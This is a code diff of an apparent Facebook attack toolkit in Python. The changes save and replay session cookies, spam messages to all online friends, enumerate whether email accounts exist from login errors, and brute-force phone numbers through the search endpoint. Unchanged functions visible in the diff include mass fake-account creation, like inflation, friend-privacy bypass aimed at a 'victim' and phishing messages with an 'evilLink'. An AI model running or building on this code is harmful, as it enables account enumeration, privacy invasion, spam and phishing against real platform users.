@@ -1,4 +1,5 @@
 import sys,os
+from platform import system
 from getpass import getpass
 from mainLib import *
 import MyParser 
@@ -20,9 +21,14 @@ import logging
 from mechanize import Request
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+import datetime
 
 blocked = 0
 masterCj = ''
+
+def flush():
+    if system() == 'Linux':
+        sys.stdout.flush()
 
 def setGlobalLogginng():
     global globalLogging
@@ -52,6 +58,7 @@ def login(email, password,state):
     elem.send_keys(password)  
     elem.send_keys(Keys.RETURN)
     all_cookies = driver.get_cookies()
+    pickle.dump( driver.get_cookies() , open("cookies.pkl","wb"))
     assert "No results found." not in driver.page_source
     driver.close()
         
@@ -166,6 +173,7 @@ def createUser(number):
             userRaw.append(str(response.read()))
             
             percentage = (i * 100.0) / int(number)
+            flush()
             print '\rCompleted [%.2f%%]\r'%percentage,
             sleep(60)
         except mechanize.HTTPError as e:
@@ -295,6 +303,7 @@ def massLogin():
         #percentage
         i+=1
         percentage = (i * 100.0) / len(people)
+        flush()
         print '\rCompleted [%.2f%%]\r'%percentage,
         if rsp == -1:
             database.removeTestUsers(person[0])
@@ -435,6 +444,7 @@ def sendRequestToList(victim):
                     #percentage
                     percentage = (i * 100.0) / len(friends)
                     i+=1
+                    flush()
                     print '\rCompleted [%.2f%%]\r'%percentage,
                             
                     if globalLogging:
@@ -589,6 +599,7 @@ def like(postId, quantity):
                                 logs(response.read())
                             
                             percentage = (j * 100.0)/total
+                            flush()
                             print '\r[%.2f%%] of likes completed\r' %(percentage), 
                             j+=1
                                 
@@ -1017,6 +1028,13 @@ def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy):
 #            print 'Ctrl+c SIGNAL Caught\n'
 #            return
 
+def getTime():
+    hour = datetime.datetime.strftime(datetime.datetime.now(), '%H:%M')
+    if int(hour.split(':')[0]) >= 12:
+        hour += 'am'
+    else:
+        hour += 'pm'
+    return hour
 
 def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink):
     
@@ -1032,10 +1050,9 @@ def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,e
             'message_batch[0][thread_id]' : '',
             'message_batch[0][author]' : 'fbid:'+c_user,
             'message_batch[0][author_email]' : '',
-            'message_batch[0][coordinates]' : '',
-            'message_batch[0][timestamp]' : '1394766424499',
+            'message_batch[0][timestamp]' : str(int(time())),
             'message_batch[0][timestamp_absolute]' : 'Today',
-            'message_batch[0][timestamp_relative]' : '12:07am',
+            'message_batch[0][timestamp_relative]' : getTime(),
             'message_batch[0][timestamp_time_passed]' : '0',
             'message_batch[0][is_unread]' : 'false',
             'message_batch[0][is_cleared]' : 'false',
@@ -1268,28 +1285,24 @@ def linkFriends(victim):
     linkedFile.close()
     
 def getName(userId):
-    delay = 0
-    while delay < 60:
-        try:
-            response = br.open('https://graph.facebook.com/'+str(userId))
-            resultado = response.read()
-            json_dump = json.loads(resultado)
-            try:
-                return str(json_dump['username'])
-            except:
-                return str(userId)
-        
-        except mechanize.HTTPError as e:
-                print str(e.code) + 'Increasing delay %d' %delay
-                delay += 30 
-                sleep(delay)
-        except mechanize.URLError as e:
-                print str(e.reason.args)  + 'Increasing delay %d' %delay
-                delay += 30
-                sleep(delay)
-                
-    #In case the while ends
-    return str(userId)
+    try:
+        response = br.open('https://www.facebook.com/'+str(userId))
+        data = response.read()
+        match = re.search("_8_2",data)
+        if match is not None:
+            start = match.end() + 33
+            matchBis = re.search('">',data[start:])
+            if matchBis is not None:
+                return data[start:start+matchBis.start()]
+        return userId
+    except mechanize.HTTPError as e:
+        print str(e.code)
+        return userId
+    except mechanize.URLError as e:
+        print str(e.reason.args)
+        return userId
+    except:
+        return userId
 
 
 def mkdir(directory,root):
@@ -1398,6 +1411,7 @@ def analyzeGraph(victim):
                 userNames.append(user)
                 nodekeys[idkeys[elements]] = user
                 percentage = (i * 100.0)/len(idkeys.keys())
+                flush()
                 print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(idkeys.keys()), percentage), 
                 i+=1
             except:
@@ -1598,7 +1612,7 @@ def bypassFriendshipPrivacyPlot(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
-        
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -1723,6 +1737,7 @@ def bypassFriendshipPrivacy(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -1882,8 +1897,7 @@ def simpleGraph(friends, victim):
                 myGraph.add_edge(element, friend)
         
     friendshipFile.close()
-    
-    mkdir('objects',root+'\\'+directory)
+    mkdir('objects', os.path.join(root,directory))
     
     A = nx.adj_matrix(myGraph)
     saveObjects(victim, A, coleccion)
@@ -1899,6 +1913,7 @@ def friendshipPlot(text,victim):
     friendsID = []
     counter = 0
     lastId = 0
+    count = 0
     while counter < 4:
         matchStart = re.search("_5q6s _8o _8t lfloat _ohe\" href=\"https://www.facebook.com/",text)
         if matchStart is not None:
@@ -1910,6 +1925,9 @@ def friendshipPlot(text,victim):
                 fbid = getUserID(name)
                 if fbid is not -1:
                     friendsID.append(fbid)
+                    count += 1
+                    flush()
+                    print "\rFriends enumerated: %d" %count,
             text = text[matchEnd.start()+start:]
         else:
             try:
@@ -2046,13 +2064,13 @@ def seeMore(start,victim,transitive):
 def getUserID(user):
 #Grabs the user Id using the OpenGraph
     try:
-        response = br.open('https://graph.facebook.com/'+str(user))
-        resultado = response.read()
-        json_dump = json.loads(resultado)
-        try:
-            return json_dump['id']
-        except:
-            return -1
+        response = br.open('https://www.facebook.com/'+str(user))
+        data = response.read()
+        #json_dump = json.loads(resultado)
+        #try:
+        #    return json_dump['id']
+        #except:
+        #    return -1
     
     except mechanize.HTTPError as e:
             print e.code
@@ -2060,6 +2078,15 @@ def getUserID(user):
     except mechanize.URLError as e:
             print e.reason.args
             return -1
+    try:
+        match = re.search("fb://profile/",data)
+        if match is not None:
+            start = match.end()
+            matchBis = re.search('"',data[start:])
+            if matchBis is not None:
+                return data[start:start+matchBis.start()]
+    except:
+        return user
     
 def logs(messagelog):
     
@@ -2126,7 +2153,7 @@ def dotFile(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
-        
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -2489,6 +2516,7 @@ def likeDev(postId):
                         logs(response.read())
                     
                     percentage = (j * 100.0)/total
+                    flush()
                     print '\r[%.2f%%] of likes completed\r' %(percentage), 
                     j+=1
                         
@@ -2656,6 +2684,7 @@ def massLoginTest():
             #percentage
             i+=1
             percentage = (i * 100.0) / len(people)
+            flush()
             print '\rCompleted [%.2f%%]\r'%percentage,
         except:
             print 'Error with user %s' %person[0]
@@ -2738,7 +2767,7 @@ def dotFileDatabase(victim, transitive):
     for friends in friendships:
         #Percentage calculus 
         percentage = (i * 100.0)/len(friendships)
-        
+        flush()
         print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,len(friendships), percentage), 
         i+=1
         #Only if the node wasn't visited 
@@ -3015,53 +3044,35 @@ def accountexists(mailList):
         mails.append(line.strip('\n'))
     
     mailFile.close()
+    driver = webdriver.Firefox()
     
     for email in mails:
-        cookieHandler = customCookies()
-        # Empty the cookies
-        cj.clear()
         # Access the login page to get the forms
-        try:
-            br.open('https://login.facebook.com/login.php')
-            br.select_form(nr=0)
-        except mechanize.HTTPError as e:
-            logs(str(e.code) + ' on login module')
-            print str(e.code) + ' on login module'
-            continue
-        except mechanize.URLError as e:
-            logs(str(e.reason.args) + ' on login module')
-            print str(e.reason.args) + ' on login module'
-            continue
-        except:
-            logs("Can't Access the login.php form")
-            print "\rCan't Access the login.php form\r"
-            continue
-            # Select the first form
+        driver.delete_all_cookies()
+        driver.get("https://www.facebook.com/")
+        assert "Facebook" in driver.title
+        elem = driver.find_element_by_name("email")
+        elem.send_keys(email)
+        elem = driver.find_element_by_name("pass")
+        elem.send_keys(password)  
+        elem.send_keys(Keys.RETURN)
         
-            
-        # Set email and pass to the form
         try:
-            br.form['email'] = email
-            br.form['pass'] = password
-        except:
-            logs("Something bad happen.. Couldn't set email and password")
-            print "\rSomething bad happen.. Couldn't set email and password\r"
-        # Send the form
-        try:
-            response = br.submit()
-            line = response.read()
+            line = driver.page_source
             match = re.search('Por favor, vuelve a introducir tu contrase',line)
             if match is not None:
-                print email + ' Cuenta existente'
+                print email + ' Cuenta existente :D !!'
                 verified = open(os.path.join("PRIVATE","existence","verified.txt"),"a")
                 verified.write(email + '\n')
                 verified.close()
             else:
-                print email + ' Cuenta inexistente'
+                print email + ' Cuenta inexistente :('
         except:
             logs('Fatal error while submitting the login form')
             print '\rFatal error while submitting the login form\r'
-
+        
+    
+    driver.close()    
     verified.close()
 
 def checkLogin(mailList):
@@ -3134,19 +3145,119 @@ def steal():
         else:
             sleep(10)
             print emails + ' not valid email or password'
+
+def sendPrivateMessage(message,buddy):
+    
+    c_user = getC_user()
+    
+    try:
+        fb_dtsg = set_dtsg()
+        if (fb_dtsg == 0):
+            print 'ERROR MOTHER FUCKER -_-'
             
+        arguments = {
+            'message_batch[0][action_type]' : 'ma-type:user-generated-message',
+            'message_batch[0][thread_id]' : '',
+            'message_batch[0][author]' : 'fbid:'+c_user,
+            'message_batch[0][author_email]' : '',
+            'message_batch[0][coordinates]' : '',
+            'message_batch[0][timestamp]' : str(int(time())),
+            'message_batch[0][timestamp_absolute]' : 'Today',
+            'message_batch[0][timestamp_relative]' : getTime(),
+            'message_batch[0][timestamp_time_passed]' : '0',
+            'message_batch[0][is_unread]' : 'false',
+            'message_batch[0][is_forward]' : 'false',
+            'message_batch[0][is_filtered_content]' : 'false',
+            'message_batch[0][is_filtered_content_bh]' : 'false',
+            'message_batch[0][is_filtered_content_account]' : 'false',
+            'message_batch[0][is_filtered_content_quasar]' : 'false',
+            'message_batch[0][is_filtered_content_invalid_app]' : 'false',
+            'message_batch[0][is_spoof_warning]' : 'false',
+            'message_batch[0][source]' : 'source:titan:web',
+            'message_batch[0][body]' : message,
+            'message_batch[0][has_attachment]' : 'false',
+            'message_batch[0][html_body]' : 'false',
+            'message_batch[0][specific_to_list][0]' : 'fbid:' + buddy,
+            'message_batch[0][specific_to_list][1]' : 'fbid:' + c_user,
+            'message_batch[0][force_sms]' : 'true',
+            'message_batch[0][ui_push_phase]' : 'V3',
+            'message_batch[0][status]' : '0',
+            'message_batch[0][message_id]' : '<1394766424499:3126670212-4125121119@mail.projektitan.com>',
+            'message_batch[0][client_thread_id]' : 'user:'+str(c_user),
+            'message_batch[0][manual_retry_cnt]' : '0',
+            'client' : 'web_messenger',
+            '__user' : c_user,
+            '__a' : '1',
+            '__dyn' : 'aKTyBW8BgBlyibgggDDzbHaF8x9DzECQHyUmyVbGAGQi8VpCC-KGBxmm6oxpbGES5V8Gh6VEChyd1eFEsz-dCxK9xibyfCChQEjkwzyAAEnhRGeKmhmKVRz9Hxmi8V9-i78',
+            '__req' : '1w',
+            'fb_dtsg' : fb_dtsg,
+            'ttstamp' : '2658171975212154891167782118',
+            '__rev' : '1925563'
+            }
+        datos = urlencode(arguments)
+        response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php',datos)
+        
+        if globalLogging:
+                logs(response.read())
+    
+    except mechanize.HTTPError as e:
+        print e.code
+    except mechanize.URLError as e:
+            print e.reason.args         
+    except:
+        print 'Ctrl+c SIGNAL Caught\n'
+        return
+
+def sendBroadcast(online):
+    print 'Cookies will be saved and deleted after execution'
+    try:
+        driver = webdriver.Firefox()
+        driver.get("https://www.facebook.com/")
+        cookies = pickle.load(open("cookies.pkl", "rb"))
+        for cookie in cookies:
+            driver.add_cookie(cookie)
+        open("cookies.pkl", "wb").close()
+        driver.get("https://m.facebook.com/buddylist.php?ref_component=mbasic_home_header&ref_page=/wap/home.php&refid=8")
+        assert "Active Friends" in driver.title
+        data = driver.page_source
+        driver.close()
+        buddies = MyParser.parseOnline(data)
+        if len(buddies) == 0:
+            print 'Mmm houston we have a problem.. ERROR'
+            return
+        message = raw_input('Enter the message to send: ')
+        percentage = 0.0
+        i = 0
+        for buddy in buddies:
+            flush()
+            percentage = (100.0 * i)/len(buddies)
+            print '\rCompleted [%.2f%%]\r'%percentage,
+            sendPrivateMessage(message, buddy)
+            i += 1
+    except mechanize.HTTPError as e:
+        logs(e.code)
+        print e.code
+    except mechanize.URLError as e:
+        logs(e.reason.args)
+        print e.reason.args    
+    except:
+        logs('Error in the sendBroadcast module')
+        print '\rError in the sendBroadcast module\r'
+        raise
+ 
 def bruteforceCel(first,start,end):
     c_user = getC_user()
     try:
-        f = open('cellphones\\cellphones.txt','a')
+        f = open( os.path.join("cellphones","cellphones.txt"),"a" )
         f.close()
     except:
-        f = open('cellphones\\cellphones.txt','wb')
+        f = open( os.path.join("cellphones","cellphones.txt"),"wb" )
         f.close()
     percentage = 0.0
     verified = 0
     for cellphone in range(int(start),int(end)):
         percentage = ((cellphone-int(start)) * 100.0) / (int(end) - int(start))
+        flush()
         print '\rCompleted [%.6f%%] - %d cellphone - %d verified\r' %(percentage, cellphone, verified),
         try:
             response = br.open('https://www.facebook.com/typeahead/search/facebar/query/?value=["'+first+str(cellphone)+'"]&context=facebar&grammar_version=7466c20ac89f47d6185f3a651461c1b1bac9a82d&content_search_mode&viewer='+c_user+'&rsp=search&qid=8&max_results=10&sid=0.24097281275317073&__user='+c_user+'&__a=1&__dyn=7nmajEyl2qm9udDgDxyIGzGpUW9ACxO4p9GgyimEVFLFwxBxCbzESu49UJ6K59poW8xHzoyfw&__req=1o&__rev=1536505')
@@ -3155,7 +3266,7 @@ def bruteforceCel(first,start,end):
             #print str(json_dump['payload']['entities'][0]['path'])
             #print str(json_dump['payload']['entities'][0]['uid'])
             #print first + str(cellphone)
-            f = open('cellphones\\cellphones.txt','a')
+            f = open( os.path.join("cellphones","cellphones.txt"),"a" )
             f.write(first + str(cellphone)+' '+str(json_dump['payload']['entities'][0]['path']) + ' ' + str(json_dump['payload']['entities'][0]['uid'])+'\n')
             f.close()
             verified += 1
